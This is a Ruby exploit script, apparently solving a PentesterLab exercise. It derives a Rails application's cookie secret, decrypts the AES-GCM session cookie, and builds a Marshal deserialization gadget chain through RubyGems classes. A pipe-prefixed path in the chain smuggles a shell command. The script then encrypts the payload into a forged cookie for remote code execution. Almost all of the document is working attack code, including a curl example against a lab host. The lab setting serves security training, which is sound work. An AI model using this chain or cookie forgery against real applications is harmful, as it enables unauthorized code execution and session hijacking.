
# Name of app PentesterLab
# example
# curl -H "Cookie: _pentester_lab_session=QI7JYwIr7hg%2FpnOZzRcQJ8vTFwwtodQmPkEK9VPWkKWN7kwqsiUNJsZSHq2uZTfiPoPzmuFE6MOKsQTYSXCMgLX2JEn1tZ6nhaS5dsvBRocZPVZjZXc%2BtRXEfFOrlGECPu60smSqC5S7gzmL1xi%2Ft7m9vg1ipFJjpIeC83qluQ1%2FzMtMKrr1a9NwX9fgj4lKMG%2Ft8M6AOgS9xi0Evg%2FcoLmnnN4HNTBwr9FGCSM%2FgzurYWy%2FSPvCvHg5zHDgeH6aN3WkSundPDfJrxc44vlLMK80IjoDJAHwGA%3D%3D--8Jv1eT%2BjVOLVY4Om--leKx4Kd98ZuyComqXYp8Bw%3D%3D" http://ptl-585aa366-c7b516e8.libcurl.so/

require 'uri'

cookie = URI.decode "ZxkjppjTQ4EDwQbjhSqfZ6MwflADiYX6SobYNWQkp2uNXqaiVjrzGTx%2FGmlpLYD3FnbUC5lKWiSd22txlwQ0NsTDVT8ZiwdxsQsXyy1i7RMsX7WD1VOCgavulvFB7muzEZQ%2FP0K2haZivmXJtM6GiDZpF%2Fp25Pd7qb2d9qk42FICKPFjPummcN0BCeVFLgAglNtstnk9yNkVFppfxd6n543h8cyiPLRuqusycWVxphcHFyBAyIeqqTZeVQggBsjJO1s%3D--ro8WzUyDVAeB%2B2Xa--b55KeU%2BdctQ8uAuFHQ3vdw%3D%3D"
require 'openssl'
require 'base64'

def secret
    secret = Digest::MD5.hexdigest("PentesterLab::Application")
    OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end

cipher = OpenSSL::Cipher.new("aes-256-gcm")

encrypted_data, iv, auth_tag = cookie.split("--").map { |v| ::Base64.strict_decode64(v) }
cipher.decrypt
cipher.key = secret
cipher.iv  = iv
cipher.auth_tag = auth_tag
cipher.auth_data = ""

decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final
puts decrypted_data # let you see what to change e.g user_id

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
    [$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts payload
  
cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

# Rely on OpenSSL for the initialization vector
iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(payload)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob,"=/+")
